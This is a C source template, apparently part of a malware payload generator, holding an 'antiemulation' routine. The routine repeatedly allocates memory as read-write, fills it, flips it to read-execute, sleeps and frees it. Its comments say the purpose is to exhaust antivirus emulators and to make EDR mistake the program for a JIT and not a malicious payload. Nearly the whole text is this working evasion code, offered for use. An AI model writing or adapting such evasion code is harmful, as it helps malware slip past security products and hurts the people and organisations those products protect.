

#define SIR_ITERATION_COUNT {{SIR_ITERATION_COUNT}}
#define SIR_ALLOC_COUNT {{SIR_ALLOC_COUNT}}

#define SIR_SLEEP_TIME 200  // ms


/* This will allocate SIR_ALLOC_COUNT RW memory regions, 
     set them to RX, and free them 

    The idea is that the AV emulator will probably give up, either because
    of used memory is above maximum, or amount of instructions, or 
    number of API calls, or time. 

    It hopefully also makes the EDR think this program is doing some
    kind of interpreter or JIT compilation, and not a malicious payload.
*/

void antiemulation() {
    void* allocs[SIR_ALLOC_COUNT];
    DWORD result;

    for(int i=0; i<SIR_ITERATION_COUNT; i++) {
        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
            allocs[n] = VirtualAlloc(
                NULL, 
                {{PAYLOAD_LEN}}, 
                0x3000, 
                p_RW
            );
            char *ptr = allocs[n];

            // write every byte of it
            for(int i=0; i<{{PAYLOAD_LEN}}; i++) {
                ptr[i] = 0x23;
            }
        }

        // Write something. 
        /*for(int n=0; n<SIR_ALLOC_COUNT; n++) {
            char *alloc = allocs[n];
            alloc[0] = 0; // overwrite the first byte
        }*/

        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
            if (VirtualProtect(
                allocs[n], 
                {{PAYLOAD_LEN}}, 
                p_RX, 
                &result) == 0) 
            {
                return 7;
            }
        }

        Sleep(SIR_SLEEP_TIME);

        BOOL bSuccess;
        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
            bSuccess = VirtualFree(
                            allocs[n],
                            {{PAYLOAD_LEN}},
                            0x00008000); // MEM_RELEASE
        }
    }


}
